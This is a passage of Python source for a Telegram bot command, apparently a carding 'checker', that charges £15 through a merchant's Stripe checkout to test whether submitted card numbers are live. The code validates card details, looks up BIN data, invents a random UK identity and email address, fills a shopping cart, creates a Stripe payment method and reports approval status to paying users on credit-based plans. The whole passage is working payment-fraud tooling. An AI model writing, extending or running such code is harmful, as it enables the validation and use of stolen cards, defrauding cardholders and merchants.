                return await self.format_response(cc, mes, ano, cvv, "ERROR", "Invalid card number", username, time.time()-start_time, user_data)

            if not mes.isdigit() or len(mes) not in [1, 2] or not (1 <= int(mes) <= 12):
                return await self.format_response(cc, mes, ano, cvv, "ERROR", "Invalid month", username, time.time()-start_time, user_data)

            if not ano.isdigit() or len(ano) not in [2, 4]:
                return await self.format_response(cc, mes, ano, cvv, "ERROR", "Invalid year", username, time.time()-start_time, user_data)

            if not cvv.isdigit() or len(cvv) not in [3, 4]:
                return await self.format_response(cc, mes, ano, cvv, "ERROR", "Invalid CVV", username, time.time()-start_time, user_data)

            if len(ano) == 2:
                ano = '20' + ano

            bin_info = await self.get_bin_info(cc)
            logger.bin_info(f"BIN: {cc[:6]} | {bin_info['scheme']} - {bin_info['type']} | {bin_info['bank']} | {bin_info['country']} [{bin_info['emoji']}]")

            # Get random UK address
            address_info = random.choice(self.uk_addresses)
            email = f"{address_info['first_name'].lower()}.{address_info['last_name'].lower()}{random.randint(1000,9999)}@gmail.com"

            user_info = {
                'first_name': address_info['first_name'],
                'last_name': address_info['last_name'],
                'email': email,
                'address': address_info['address'],
                'city': address_info['city'],
                'postcode': address_info['postcode'],
                'phone': address_info['phone'],
                'country': address_info['country']
            }

            logger.user(f"User: {user_info['first_name']} {user_info['last_name']} | {email} | {user_info['phone']}")

            async with httpx.AsyncClient(
                timeout=30.0,
                follow_redirects=True,
                limits=httpx.Limits(max_keepalive_connections=5, max_connections=10),
                http2=True
            ) as client:

                if not await self.initialize_session(client):
                    return await self.format_response(cc, mes, ano, cvv, "DECLINED", "Failed to initialize session", username, time.time()-start_time, user_data, bin_info)

                add_success, error = await self.add_product_to_cart(client)
                if not add_success:
                    return await self.format_response(cc, mes, ano, cvv, "DECLINED", error, username, time.time()-start_time, user_data, bin_info)

                tokens, token_error = await self.get_checkout_tokens(client)
                if not tokens:
                    return await self.format_response(cc, mes, ano, cvv, "DECLINED", token_error, username, time.time()-start_time, user_data, bin_info)

                payment_result = await self.create_stripe_payment_method(client, (cc, mes, ano, cvv), user_info)
                if not payment_result['success']:
                    error_msg = payment_result['error']
                    logger.warning(f"Payment method creation failed: {error_msg}")
                    if payment_result.get('unsupported'):
                        return await self.format_response(cc, mes, ano, cvv, "DECLINED", error_msg, username, time.time()-start_time, user_data, bin_info)
                    else:
                        return await self.format_response(cc, mes, ano, cvv, "DECLINED", error_msg, username, time.time()-start_time, user_data, bin_info)

                result = await self.process_direct_checkout(client, tokens, payment_result['payment_method_id'], user_info)

                elapsed_time = time.time() - start_time
                logger.success(f"Card check completed in {elapsed_time:.2f}s - Status: {result['status']} - Message: {result['message']}")

                return await self.format_response(cc, mes, ano, cvv, result['status'], result['message'], username, elapsed_time, user_data, bin_info)

        except httpx.TimeoutException:
            logger.error("Request timeout")
            return await self.format_response(cc, mes, ano, cvv, "ERROR", "Request timeout", username, time.time()-start_time, user_data, bin_info)
        except httpx.ConnectError:
            logger.error("Connection error")
            return await self.format_response(cc, mes, ano, cvv, "ERROR", "Connection failed", username, time.time()-start_time, user_data, bin_info)
        except Exception as e:
            logger.error(f"Unexpected error: {str(e)}")
            return await self.format_response(cc, mes, ano, cvv, "ERROR", f"System error: {str(e)[:80]}", username, time.time()-start_time, user_data, bin_info)

# Command handler - CORRECTED WITH UNIVERSAL CHARGE PROCESSOR
@Client.on_message(filters.command(["xp", ".xp", "$xp"]))
@auth_and_free_restricted
async def handle_stripe_charge_15(client: Client, message: Message):
    try:
        user_id = message.from_user.id
        username = message.from_user.username or str(user_id)

        # CHECK: First check if command is disabled
        command_text = message.text.split()[0]
        command_name = command_text.lstrip('/.$')

        if is_command_disabled(command_name):
            await message.reply(get_command_offline_message(command_text))
            return

        # Check if user is banned
        if is_user_banned(user_id):
            await message.reply("""<pre>⛔ User Banned</pre>
━━━━━━━━━━━━━
⟐ <b>Message</b>: You have been banned from using this bot.
⟐ <b>Contact</b>: <code>@D_A_DYY</code> for assistance.
━━━━━━━━━━━━━""")
            return

        # Load user data
        users = load_users()
        user_id_str = str(user_id)
        if user_id_str not in users:
            await message.reply("""<pre>🔒 Registration Required</pre>
━━━━━━━━━━━━━
⟐ <b>Message</b>: You need to register first with /register
⟐ <b>Contact</b>: <code>@D_A_DYY</code> for assistance.
━━━━━━━━━━━━━""")
            return

        user_data = users[user_id_str]
        user_plan = user_data.get("plan", {})
        plan_name = user_plan.get("plan", "Free")

        # Check cooldown (owner is automatically skipped in check_cooldown function)
        can_use, wait_time = check_cooldown(user_id, "xp")
        if not can_use:
            await message.reply(f"""<pre>⏳ Cooldown Active</pre>
━━━━━━━━━━━━━
⟐ <b>Message</b>: Please wait {wait_time:.1f} seconds before using this command again.
⟐ <b>Your Plan:</b> <code>{plan_name}</code>
⟐ <b>Anti-Spam:</b> <code>{user_plan.get('antispam', 15)}s</code>
━━━━━━━━━━━━━""")
            return

        args = message.text.split()
        if len(args) < 2:
            if charge_processor:
                await message.reply(charge_processor.get_usage_message(
                    "xp", 
                    "Stripe Charge 15£",
                    "4111111111111111|12|2025|123"
                ))
            else:
                await message.reply("""<pre>#WAYNE ─[STRIPE CHARGE 15£]─</pre>
━━━━━━━━━━━━━
⟐ <b>Command</b>: <code>/xp</code> or <code>.xp</code> or <code>$xp</code>
⟐ <b>Usage</b>: <code>/xp cc|mm|yy|cvv</code>
⟐ <b>Example</b>: <code>/xp 4111111111111111|12|2025|123</code>
━━━━━━━━━━━━━
<b>~ Note:</b> <code>Charges 15£ via Stripe gateway (Deducts 2 credits AFTER check completes)</code>
<b>~ Note:</b> <code>Free users can use in authorized groups with credit deduction</code>""")
            return

        card_details = args[1].strip()

        cc_parts = card_details.split('|')
        if len(cc_parts) < 4:
            await message.reply("""<pre>❌ Invalid Format</pre>
━━━━━━━━━━━━━
⟐ <b>Message</b>: Invalid card format.
⟐ <b>Correct Format</b>: <code>cc|mm|yy|cvv</code>
⟐ <b>Example</b>: <code>4111111111111111|12|2025|123</code>
━━━━━━━━━━━━━""")
            return

        cc = cc_parts[0]
        mes = cc_parts[1]
        ano = cc_parts[2]
        cvv = cc_parts[3]

        # Show processing message
        processing_msg = await message.reply(
            charge_processor.get_processing_message(
                cc, mes, ano, cvv, username, plan_name, 
                "Stripe Charge 15£", "xp"
            ) if charge_processor else f"""<b>「$cmd → /xp」| <b>WAYNE</b> </b>
━━━━━━━━━━━━━━━
<b>[•] Card-</b> <code>{cc}|{mes}|{ano}|{cvv}</code>
<b>[•] Gateway -</b> Stripe Charge 15£
<b>[•] Status-</b> Processing... ⏳
━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━
<b>[+] Plan:</b> {plan_name}
<b>[+] User:</b> @{username}
━━━━━━━━━━━━━━━
<b>Checking card... Please wait.</b>"""
        )

        # Create checker instance
        checker = StripeCharge15Checker()

        # Process command through universal charge processor
        if charge_processor:
            success, result, credits_deducted = await charge_processor.execute_charge_command(
                user_id,                    # positional
                checker.check_card,         # positional
                card_details,               # check_args[0]
                username,                   # check_args[1]
                user_data,                  # check_args[2]
                credits_needed=2,           # keyword
                command_name="xp",          # keyword
                gateway_name="Stripe Charge 15£"  # keyword
            )

            await processing_msg.edit_text(result, disable_web_page_preview=True)
        else:
            # Fallback to old method if charge_processor not available
            result = await checker.check_card(card_details, username, user_data)
            await processing_msg.edit_text(result, disable_web_page_preview=True)

    except Exception as e:
        error_msg = str(e)[:150]
        await message.reply(f"""<pre>❌ Command Error</pre>
━━━━━━━━━━━━━
⟐ <b>Message</b>: An error occurred while processing your request.
⟐ <b>Error</b>: <code>{error_msg}</code>
⟐ <b>Contact</b>: <code>@D_A_DYY</code> for assistance.
━━━━━━━━━━━━━""")
